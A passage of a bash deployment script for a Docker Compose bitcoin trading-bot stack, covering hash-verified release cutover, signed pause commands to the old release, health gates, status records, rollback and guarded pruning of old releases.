      echo "release/config identity rejected" >&2
      return 1
    }
  fi
  config_hash=$(sha256sum "$release_env" | awk '{print $1}')
  [[ "$config_hash" =~ ^[0-9a-f]{64}$ ]] || return 1
  local clean_env=(env -i "PATH=$PATH" "HOME=${HOME:-/tmp}" \
    "RELEASE_TAG=$release_tag" "ENVELOPE_RELEASE_HASH=$release_hash" \
    "SIDECAR_RELEASE_HASH=$release_hash" "DEPLOYED_RELEASE_HASH=$release_hash" \
    "DEPLOYED_CONFIG_SHA256=$config_hash" "COMPOSE_PROJECT_NAME=$COMPOSE_PROJECT_NAME")
  local passthrough
  for passthrough in DOCKER_HOST DOCKER_CONTEXT DOCKER_CONFIG XDG_RUNTIME_DIR; do
    [[ -n "${!passthrough:-}" ]] && clean_env+=("$passthrough=${!passthrough}")
  done
  "${clean_env[@]}" docker compose --project-name "$COMPOSE_PROJECT_NAME" \
    --env-file "$release_env" \
    -f "$release_dir/docker-compose.yml" "$@"
}

compose_for "$NEW" "$RELEASE_HASH" "$NEW_TAG" config -q
compose_for "$NEW" "$RELEASE_HASH" "$NEW_TAG" build moneyflow

OLD=''
OLD_HASH=''
OLD_TAG=''
OLD_COMMAND_HMAC_KEY=''
OLD_MONITOR_MODE=''
OLD_EXECUTION_MODE=''
OLD_CONFIG=''
OLD_CONFIG_SHA=''
OLD_SUCCESS_MARKER=''
if [[ -L "$CURRENT" ]]; then
  OLD=$(readlink -f "$CURRENT" || true)
  OLD_CONFIG="$CONFIG_ROOT/$(basename "$OLD").env"
  OLD_SUCCESS_MARKER="$CONFIG_ROOT/$(basename "$OLD").success"
  if is_timestamp_release_dir "$OLD" \
     && [[ -f "$OLD/RELEASE_SHA256.txt" && ! -L "$OLD/RELEASE_SHA256.txt" ]] \
     && require_release_config "$OLD" "$OLD_CONFIG"; then
    OLD_HASH=$(awk 'NF{print $1;exit}' "$OLD/RELEASE_SHA256.txt")
    [[ "$OLD_HASH" =~ ^[0-9a-f]{64}$ ]] || fail 'current release has an invalid release hash'
    OLD_CONFIG_SHA=$(sha256sum "$OLD_CONFIG" | awk '{print $1}')
    [[ "$OLD_CONFIG_SHA" =~ ^[0-9a-f]{64}$ ]] || fail 'current config hash is invalid'
    [[ -f "$OLD_SUCCESS_MARKER" && ! -L "$OLD_SUCCESS_MARKER" \
       && $(stat -c '%u' "$OLD_SUCCESS_MARKER") == "$BOT_UID" \
       && $(stat -c '%g' "$OLD_SUCCESS_MARKER") == "$BOT_GID" \
       && $(stat -c '%a' "$OLD_SUCCESS_MARKER") == 600 \
       && $(awk 'END{print NR}' "$OLD_SUCCESS_MARKER") == 1 ]] || \
      fail 'current release has no safe, single-line success marker'
    marker_release=''
    marker_config=''
    marker_extra=''
    read -r marker_release marker_config marker_extra < "$OLD_SUCCESS_MARKER" || true
    [[ "$marker_release" == "$OLD_HASH" && "$marker_config" == "$OLD_CONFIG_SHA" \
       && -z "$marker_extra" ]] || \
      fail 'current success marker does not match its release and config hashes'
    OLD_TAG="bitcoin-${OLD_HASH:0:16}"
    # config-snapshots is writable by the deployment user, so sourcing it
    # here would have escalated that user to root.
    OLD_EXECUTION_MODE=$(env_file_get "$OLD_CONFIG" EXECUTION_MODE) \
      || OLD_EXECUTION_MODE=simulation
    [[ -n "$OLD_EXECUTION_MODE" ]] || OLD_EXECUTION_MODE=simulation
    case "$OLD_EXECUTION_MODE" in
      simulation|testnet|live) OLD_MONITOR_MODE=$OLD_EXECUTION_MODE ;;
      *) fail 'current release config snapshot has invalid EXECUTION_MODE' ;;
    esac
    OLD_COMMAND_HMAC_KEY=$(env_file_get "$OLD_CONFIG" COMMAND_HMAC_KEY) \
      || OLD_COMMAND_HMAC_KEY=''
    [[ ${#OLD_COMMAND_HMAC_KEY} -ge 32 ]] || fail 'current release command key is missing or too short'
  else
    fail 'current release link is malformed; refusing an unsafe upgrade'
  fi
else
  project_empty || \
    fail 'current release is absent but the fixed Compose project still owns containers'
fi

submit_old_command(){
  local command=$1 args_json=$2 cid
  cid=$(python3 -c 'import uuid; print(uuid.uuid4().hex)')
  COMMAND_HMAC_KEY="$OLD_COMMAND_HMAC_KEY" ENVELOPE_RELEASE_HASH="$OLD_HASH" \
    PYTHONPATH="$OLD" python3 - \
    "$PERSIST" "$cid" "$command" "$args_json" <<'PY'
import json
import sys
import time
from pathlib import Path
from services.common.atomic import atomic_write_json
from services.common.envelope import BUS_COMMAND, sign_envelope

root, command_id, command, args_json = sys.argv[1:]
payload = {
    'command_id': command_id,
    'command': command,
    'args': json.loads(args_json),
    'created_at': time.time(),
}
signed = sign_envelope(
    producer='deploy-installer', purpose=BUS_COMMAND,
    payload=payload, ttl_seconds=120,
)
atomic_write_json(Path(root) / 'commands/inbox' / f'{command_id}.json', signed)
PY
  local result="$PERSIST/command_results/command_result_${cid}.json"
  for _ in $(seq 1 45); do
    [[ -s "$result" ]] && break
    sleep 1
  done
  [[ -s "$result" ]] || {
    echo "current sidecar did not acknowledge $command ($cid)" >&2
    return 1
  }
  python3 - "$result" <<'PY'
import json
import sys

payload = json.load(open(sys.argv[1], encoding='utf-8'))
if payload.get('ok') is not True:
    raise SystemExit('deployment command failed: ' + json.dumps(payload, sort_keys=True))
PY
  rm -f -- "$result"
}

DEST="$RELEASES/$STAMP"
[[ ! -e "$DEST" ]] || fail "release destination already exists: $DEST"
mv "$NEW" "$DEST"
rm -rf --one-file-system -- "$TMP"

stack_healthy(){
  local release_dir=$1 release_hash=$2 release_tag=$3 release_env config_hash passthrough
  local clean_env
  release_env="$CONFIG_ROOT/$(basename "$release_dir").env"
  require_release_config "$release_dir" "$release_env" || return 1
  config_hash=$(sha256sum "$release_env" | awk '{print $1}')
  [[ "$config_hash" =~ ^[0-9a-f]{64}$ ]] || return 1
  clean_env=(env -i "PATH=$PATH" "HOME=${HOME:-/tmp}" \
    "RELEASE_TAG=$release_tag" "ENVELOPE_RELEASE_HASH=$release_hash" \
    "SIDECAR_RELEASE_HASH=$release_hash" "DEPLOYED_RELEASE_HASH=$release_hash" \
    "DEPLOYED_CONFIG_SHA256=$config_hash" "COMPOSE_PROJECT_NAME=$COMPOSE_PROJECT_NAME")
  for passthrough in DOCKER_HOST DOCKER_CONTEXT DOCKER_CONFIG XDG_RUNTIME_DIR; do
    [[ -n "${!passthrough:-}" ]] && clean_env+=("$passthrough=${!passthrough}")
  done
  "${clean_env[@]}" python3 "$release_dir/deploy/verify_stack_identity.py" \
    --release-dir "$release_dir" \
    --releases-dir "$RELEASES" \
    --release-hash "$release_hash" \
    --config "$release_env" \
    --config-root "$CONFIG_ROOT" \
    --config-sha256 "$config_hash" \
    --project "$COMPOSE_PROJECT_NAME"
}

write_deployment_status(){
  local ok=$1 status=$2 active_hash=${3:-} active_path=${4:-} active_mode=${5:-none}
  python3 - "$PERSIST" "$ok" "$status" "$active_hash" "$active_path" "$active_mode" \
    "$RELEASE_HASH" "$DEST" "$EXECUTION_MODE" "$BOT_UID" "$BOT_GID" <<'PY'
import json
import os
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

root = Path(sys.argv[1])
payload = {
    'ok': sys.argv[2] == 'true',
    'status': sys.argv[3],
    'release_hash': sys.argv[4],
    'release_path': sys.argv[5],
    'execution_mode': sys.argv[6],
    'active_release_hash': sys.argv[4],
    'active_release_path': sys.argv[5],
    'active_execution_mode': sys.argv[6],
    'attempted_release_hash': sys.argv[7],
    'attempted_release_path': sys.argv[8],
    'attempted_execution_mode': sys.argv[9],
    'at': datetime.now(timezone.utc).isoformat(),
}
path = root / 'runtime/deployment_status.json'
fd, tmp = tempfile.mkstemp(prefix='.' + path.name + '.', suffix='.tmp', dir=path.parent)
try:
    with os.fdopen(fd, 'w', encoding='utf-8') as handle:
        json.dump(payload, handle, indent=2, sort_keys=True)
        handle.write('\n')
        handle.flush()
        os.fsync(handle.fileno())
    os.chmod(tmp, 0o640)
    if os.geteuid() == 0:
        os.chown(tmp, int(sys.argv[10]), int(sys.argv[11]))
    os.replace(tmp, path)
finally:
    try:
        os.unlink(tmp)
    except FileNotFoundError:
        pass
PY
}

write_release_validation(){
  local outcome=$1 active_hash=${2:-} active_path=${3:-} active_mode=${4:-none}
  local container_gate=${5:-not-run} monitoring_gate=${6:-not-run}
  python3 - "$PERSIST" "$outcome" "$active_hash" "$active_path" "$active_mode" \
    "$RELEASE_HASH" "$DEST" "$EXECUTION_MODE" "$container_gate" "$monitoring_gate" \
    "$BOT_UID" "$BOT_GID" <<'PY'
import json
import os
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

root = Path(sys.argv[1])
path = root / 'runtime/release_validation.json'
payload = {
    'ok': sys.argv[2] == 'DEPLOYED',
    'outcome': sys.argv[2],
    'release_hash': sys.argv[3],
    'release_path': sys.argv[4],
    'execution_mode': sys.argv[5],
    'active_release_hash': sys.argv[3],
    'active_release_path': sys.argv[4],
    'active_execution_mode': sys.argv[5],
    'attempted_release_hash': sys.argv[6],
    'attempted_release_path': sys.argv[7],
    'attempted_execution_mode': sys.argv[8],
    'package_mode': os.environ.get('PACKAGE_MODE', ''),
    'manifest_verification': 'passed',
    'secret_scan': 'passed',
    'compose_config': 'passed',
    'container_health_gate': sys.argv[9],
    'monitoring_health_gate': sys.argv[10],
    'live_evidence_gate': 'passed' if sys.argv[8] == 'live' else 'not-required',
    'validated_at': datetime.now(timezone.utc).isoformat(),
}
fd, tmp = tempfile.mkstemp(prefix='.' + path.name + '.', suffix='.tmp', dir=path.parent)
try:
    with os.fdopen(fd, 'w', encoding='utf-8') as handle:
        json.dump(payload, handle, indent=2, sort_keys=True)
        handle.write('\n')
        handle.flush()
        os.fsync(handle.fileno())
    os.chmod(tmp, 0o640)
    if os.geteuid() == 0:
        os.chown(tmp, int(sys.argv[11]), int(sys.argv[12]))
    os.replace(tmp, path)
finally:
    try:
        os.unlink(tmp)
    except FileNotFoundError:
        pass
PY
}

mark_release_success(){
  local release_dir=$1 release_hash=$2 basename marker config config_hash
  basename=$(basename "$release_dir")
  is_timestamp_release_dir "$release_dir" || return 1
  [[ "$release_hash" =~ ^[0-9a-f]{64}$ ]] || return 1
  config="$CONFIG_ROOT/$basename.env"
  require_release_config "$release_dir" "$config" || return 1
  config_hash=$(sha256sum "$config" | awk '{print $1}')
  [[ "$config_hash" =~ ^[0-9a-f]{64}$ ]] || return 1
  marker="$CONFIG_ROOT/$basename.success"
  python3 - "$marker" "$release_hash" "$config_hash" "$BOT_UID" "$BOT_GID" <<'PY'
import os
from pathlib import Path
import sys
import tempfile

target = Path(sys.argv[1])
fd, temporary = tempfile.mkstemp(prefix='.' + target.name + '.', suffix='.tmp', dir=target.parent)
try:
    with os.fdopen(fd, 'w', encoding='ascii') as handle:
        handle.write(sys.argv[2] + ' ' + sys.argv[3] + '\n')
        handle.flush()
        os.fsync(handle.fileno())
    os.chmod(temporary, 0o600)
    if os.geteuid() == 0:
        os.chown(temporary, int(sys.argv[4]), int(sys.argv[5]))
    os.replace(temporary, target)
finally:
    try:
        os.unlink(temporary)
    except FileNotFoundError:
        pass
PY
}

MONITOR_MODE=$EXECUTION_MODE
NEW_CONTAINER_GATE=not-run

rollback(){
  local reason=${1:-deployment transaction failed} rc=${2:-1}
  (( rc != 0 )) || rc=1
  trap - ERR HUP INT TERM
  set +e
  echo "New release failed: $reason; rolling back with entries paused." >&2
  local down_rc=0
  local rollback_status=ROLLED_BACK_NO_PREVIOUS_RELEASE
  local active_hash='' active_path='' active_mode=none old_ok=false evidence_ok=true

  if [[ "$NEW_PROJECT_ATTEMPTED" == true ]]; then
    if [[ -d "$DEST" ]]; then
      compose_for "$DEST" "$RELEASE_HASH" "$NEW_TAG" down --remove-orphans \
        >/dev/null 2>&1 || down_rc=$?
    else
      down_rc=1
    fi
    if ! project_empty; then
      PRESERVE_FAILED_RELEASE=true
      rollback_status=ROLLBACK_BLOCKED_RESIDUAL_NEW_PROJECT_CRITICAL
      echo 'CRITICAL: attempted-release containers remain; preserving current link, release, config, and image.' >&2
      write_release_validation "$rollback_status" '' '' none "$NEW_CONTAINER_GATE" failed || true
      write_deployment_status false "$rollback_status" '' '' none || true
      exit "$rc"
    fi
    (( down_rc == 0 )) || echo 'WARNING: new Compose down failed, but an independent all-state check proved the project empty.' >&2
  elif ! project_empty; then
    if [[ -n "$OLD" && -d "$OLD" ]] \
       && [[ $(sha256sum "$OLD_CONFIG" 2>/dev/null | awk '{print $1}') == "$OLD_CONFIG_SHA" ]] \
       && stack_healthy "$OLD" "$OLD_HASH" "$OLD_TAG"; then
      if ! switch_current "$OLD"; then
        PRESERVE_FAILED_RELEASE=true
        rollback_status=ROLLBACK_CURRENT_LINK_FAILED_CRITICAL
        write_release_validation "$rollback_status" "$OLD_HASH" "$OLD" \
          "$OLD_EXECUTION_MODE" "$NEW_CONTAINER_GATE" failed || true
        write_deployment_status false "$rollback_status" "$OLD_HASH" "$OLD" \
          "$OLD_EXECUTION_MODE" || true
        exit "$rc"
      fi
      rollback_status=ROLLED_BACK_OLD_WAS_STILL_HEALTHY
      active_hash=$OLD_HASH
      active_path=$OLD
      active_mode=$OLD_EXECUTION_MODE
      old_ok=true
    else
      PRESERVE_FAILED_RELEASE=true
      rollback_status=ROLLBACK_BLOCKED_UNIDENTIFIED_PROJECT_CRITICAL
      echo 'CRITICAL: project containers remain but do not prove the exact old healthy identity; nothing was deleted or switched.' >&2
      write_release_validation "$rollback_status" "$OLD_HASH" "$OLD" \
        "${OLD_EXECUTION_MODE:-none}" "$NEW_CONTAINER_GATE" failed || true
      write_deployment_status false "$rollback_status" "$OLD_HASH" "$OLD" \
        "${OLD_EXECUTION_MODE:-none}" || true
      exit "$rc"
    fi
  fi

  if [[ "$old_ok" == true ]]; then
    write_release_validation "$rollback_status" "$active_hash" "$active_path" \
      "$active_mode" "$NEW_CONTAINER_GATE" passed || true
    write_deployment_status false "$rollback_status" "$active_hash" "$active_path" \
      "$active_mode" || true
    exit "$rc"
  fi

  if [[ -n "$OLD" && -d "$OLD" ]]; then
    if switch_current "$OLD"; then
      active_hash=$OLD_HASH
      active_path=$OLD
      active_mode=$OLD_EXECUTION_MODE
      if [[ $(sha256sum "$OLD_CONFIG" 2>/dev/null | awk '{print $1}') != "$OLD_CONFIG_SHA" ]]; then
        evidence_ok=false
        rollback_status=ROLLBACK_OLD_CONFIG_CHANGED_CRITICAL
      elif [[ "$OLD_EXECUTION_MODE" == live ]]; then
        activate_live_evidence "$OLD" "$OLD_HASH" "$OLD_CONFIG" || evidence_ok=false
      fi
      if [[ "$evidence_ok" == true ]] && \
         compose_for "$OLD" "$OLD_HASH" "$OLD_TAG" up -d --remove-orphans; then
        for _ in $(seq 1 36); do
          if stack_healthy "$OLD" "$OLD_HASH" "$OLD_TAG"; then old_ok=true; break; fi
          sleep 5
        done
      fi
      if [[ "$old_ok" == true ]]; then
        rollback_status=ROLLED_BACK_OLD_HEALTHY
        if ! as_root bash "$OLD/deploy/install_monitoring.sh" \
          "$OLD" "$OLD_MONITOR_MODE" "$OLD_HASH"; then
          rollback_status=ROLLED_BACK_OLD_HEALTHY_MONITOR_FAILED
        fi
      elif [[ "$evidence_ok" != true ]]; then
        [[ "$rollback_status" == ROLLBACK_OLD_CONFIG_CHANGED_CRITICAL ]] || \
          rollback_status=ROLLED_BACK_OLD_LIVE_EVIDENCE_INVALID_CRITICAL
        echo 'CRITICAL: old config/evidence could not be revalidated; previous live stack was not started.' >&2
      else
        rollback_status=ROLLED_BACK_OLD_UNHEALTHY_CRITICAL
        echo 'CRITICAL: previous release did not recover; manual action required.' >&2
      fi
    else
      rollback_status=ROLLBACK_CURRENT_LINK_FAILED_CRITICAL
    fi
  else
    clear_current
    as_root systemctl disable --now "bitcoin-bot-monitor-${MONITOR_MODE}.service" \
      "bitcoin-bot-monitor-report-${MONITOR_MODE}.timer" \
      bitcoin-bot-monitor-snapshot.timer >/dev/null 2>&1
  fi
  write_release_validation "$rollback_status" "$active_hash" "$active_path" \
    "$active_mode" "$NEW_CONTAINER_GATE" failed || true
  write_deployment_status false "$rollback_status" "$active_hash" "$active_path" \
    "$active_mode" || true
  exit "$rc"
}

on_cutover_failure(){
  local rc=$?
  rollback "unexpected post-preflight failure (exit $rc)" "$rc"
}

# A rollback target must already carry the two-hash success marker written only
# after its prior container and monitoring gates. Never bless a symlink here.
if [[ -n "$OLD" ]]; then
  python3 "$OLD/scripts/verify_manifest.py"
  stack_healthy "$OLD" "$OLD_HASH" "$OLD_TAG" || \
    fail 'current release is not the exact healthy four-service rollback generation'
  if [[ "$OLD_EXECUTION_MODE" == live ]]; then
    verify_live_candidate "$OLD" "$OLD_HASH" "$OLD_CONFIG" \
      "$LIVE_PREFLIGHT_MARGIN_SECONDS" || \
      fail 'current live rollback evidence lacks the required one-hour validity margin'
  fi
fi

active_before_hash=${OLD_HASH:-}
active_before_path=${OLD:-}
active_before_mode=${OLD_EXECUTION_MODE:-none}
write_deployment_status false CUTOVER_PREPARED "$active_before_hash" \
  "$active_before_path" "$active_before_mode"

trap on_cutover_failure ERR
trap 'rollback "deployment connection lost" 129' HUP
trap 'rollback "deployment interrupted" 130' INT
trap 'rollback "deployment terminated" 143' TERM

# Exchange-native protection remains active while the old execution owner is
# paused, reconciled, stopped and replaced. The trap is already armed before
# the first persistent control-plane change.
if [[ -n "$OLD" ]]; then
  [[ $(sha256sum "$OLD_CONFIG" | awk '{print $1}') == "$OLD_CONFIG_SHA" ]] || \
    fail 'current release config changed during deployment preflight'
  submit_old_command entries '{"enabled":false}'
  submit_old_command reconcile '{}'
fi
write_deployment_status false CUTOVER_IN_PROGRESS "$active_before_hash" \
  "$active_before_path" "$active_before_mode"

if [[ -n "$OLD" ]]; then
  compose_for "$OLD" "$OLD_HASH" "$OLD_TAG" down --remove-orphans
fi
project_empty || rollback 'fixed Compose project was not empty after stopping the old owner' 1
switch_current "$DEST"
if [[ "$EXECUTION_MODE" == live ]]; then
  activate_live_evidence "$DEST" "$RELEASE_HASH" "$NEW_CONFIG"
fi
rm -f -- \
  "$PERSIST/runtime/moneyflow/moneyflow_health.json" \
  "$PERSIST/runtime/sidecar/sidecar_health.json" \
  "$PERSIST/runtime/sidecar/user_stream_health.json" \
  "$PERSIST/runtime/telegram/telegram_health.json"
NEW_PROJECT_ATTEMPTED=true
compose_for "$DEST" "$RELEASE_HASH" "$NEW_TAG" up -d --remove-orphans

healthy=false
for _ in $(seq 1 48); do
  if stack_healthy "$DEST" "$RELEASE_HASH" "$NEW_TAG"; then healthy=true; break; fi
  sleep 5
done
[[ "$healthy" == true ]] || rollback 'new four-service stack did not become healthy' 1
NEW_CONTAINER_GATE=passed
write_deployment_status false INSTALLING_MONITOR "$RELEASE_HASH" "$DEST" "$EXECUTION_MODE"

# Monitoring is a release component. Its installer performs explicit
# post-start service/timer checks and never changes runtime-tree ownership.
as_root bash "$DEST/deploy/install_monitoring.sh" "$DEST" "$MONITOR_MODE" "$RELEASE_HASH"

write_release_validation DEPLOYED "$RELEASE_HASH" "$DEST" "$EXECUTION_MODE" passed passed
mark_release_success "$DEST" "$RELEASE_HASH"
write_deployment_status true DEPLOYED "$RELEASE_HASH" "$DEST" "$EXECUTION_MODE"
CONFIG_COMMITTED=true
trap - ERR HUP INT TERM EXIT

# Retain the active release plus a bounded set of externally marked successful
# generations. Every deletion target must be a canonical timestamp-named direct
# child. GNU rm is also forbidden from crossing into a nested mount.
ACTIVE=$(readlink -f "$CURRENT")
is_timestamp_release_dir "$ACTIVE" || fail 'active release is not a canonical direct child'
kept_old=0
while IFS= read -r candidate; do
  [[ -n "$candidate" ]] || continue
  resolved=$(readlink -f "$candidate" || true)
  basename=$(basename "$candidate")
  is_timestamp_release_dir "$resolved" || {
    echo "skipping non-release cleanup candidate: $candidate" >&2
    continue
  }
  [[ "$resolved" != "$ACTIVE" ]] || continue
  snapshot="$CONFIG_ROOT/$basename.env"
  marker="$CONFIG_ROOT/$basename.success"
  candidate_hash=''
  snapshot_hash=''
  marker_release=''
  marker_config=''
  marker_extra=''
  [[ -f "$resolved/RELEASE_SHA256.txt" && ! -L "$resolved/RELEASE_SHA256.txt" ]] && \
    candidate_hash=$(awk 'NF{print $1;exit}' "$resolved/RELEASE_SHA256.txt")
  valid=false
  if require_release_config "$resolved" "$snapshot" \
     && [[ -f "$marker" && ! -L "$marker" \
        && $(stat -c '%u' "$marker") == "$BOT_UID" \
        && $(stat -c '%g' "$marker") == "$BOT_GID" \
        && $(stat -c '%a' "$marker") == 600 \
        && $(awk 'END{print NR}' "$marker") == 1 ]]; then
    snapshot_hash=$(sha256sum "$snapshot" | awk '{print $1}')
    read -r marker_release marker_config marker_extra < "$marker" || true
    if [[ "$candidate_hash" =~ ^[0-9a-f]{64}$ \
       && "$snapshot_hash" =~ ^[0-9a-f]{64}$ \
       && "$marker_release" == "$candidate_hash" \
       && "$marker_config" == "$snapshot_hash" \
       && -z "$marker_extra" ]]; then
      valid=true
    fi
  fi
  if [[ "$valid" != true ]]; then
    echo "preserving unproven release candidate for manual investigation: $resolved" >&2
    continue
  fi
  if [[ "$valid" == true && $kept_old -lt $((KEEP_RELEASES - 1)) ]]; then
    kept_old=$((kept_old + 1))
    continue
  fi
  rm -rf --one-file-system -- "$resolved" || {
    echo "failed to prune exact release $resolved" >&2
    continue
  }
  [[ ! -e "$resolved" ]] || {
    echo "release contains a nested mount or could not be fully pruned: $resolved" >&2
    continue
  }
  [[ ! -L "$snapshot" && ! -L "$marker" ]] && rm -f -- "$snapshot" "$marker"
  if [[ "$candidate_hash" =~ ^[0-9a-f]{64}$ && "$candidate_hash" != "$RELEASE_HASH" ]]; then
    docker image rm "bitcoin-bot-services:bitcoin-${candidate_hash:0:16}" >/dev/null 2>&1 || true
  fi
done < <(find "$RELEASES" -mindepth 1 -maxdepth 1 -type d -printf '%T@ %p\n' | \
  sort -nr | cut -d' ' -f2-)

# Signed evidence and content-addressed backtests are audit records. They are
# never removed automatically by a deployment transaction.
echo 'Evidence/backtest retention is non-destructive; archive or prune it only under the audited manual runbook.'

echo "Deployed $RELEASE_HASH ($NEW_TAG) in $EXECUTION_MODE mode"
